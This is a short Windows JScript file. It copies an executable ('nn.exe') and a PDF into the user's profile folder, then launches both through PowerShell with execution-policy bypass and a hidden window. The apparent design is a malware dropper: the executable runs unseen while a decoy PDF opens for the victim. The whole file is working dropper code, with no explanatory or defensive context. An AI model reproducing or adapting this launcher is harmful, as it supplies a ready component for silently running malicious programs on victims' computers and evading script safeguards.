var shell = new ActiveXObject("WScript.Shell");

// Get the current username
var username = shell.ExpandEnvironmentStrings("%USERNAME%");

// Specify the destination folder on the user's desktop
var destinationFolder = "C:\\Users\\" + username;

// Specify the name of the executable file
var exeFileName = "nn.exe";
// Specify the name of the PDF file
var pdfName = "pdf1.pdf";

// Specify the full path to the executable file
var exePath = destinationFolder + "\\" + exeFileName;

// Specify the full path to the PDF file
var pdfPath = destinationFolder + "\\" + pdfName;

// Construct the PowerShell command to execute the executable file
var command1 = "powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process -FilePath '" + exePath + "' -Wait\"";
// Construct the PowerShell command to execute the PDF file
var command2 = "powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process -FilePath '" + pdfPath + "' -Wait\"";

// Create the necessary file system object
var objFSO = new ActiveXObject("Scripting.FileSystemObject");

// Copy the executable file
objFSO.CopyFile(exeFileName, exePath);

// Copy the PDF file
objFSO.CopyFile(pdfName, pdfPath);

// Run the PowerShell commands
shell.Run(command1, 0, false);
shell.Run(command2, 0, false);
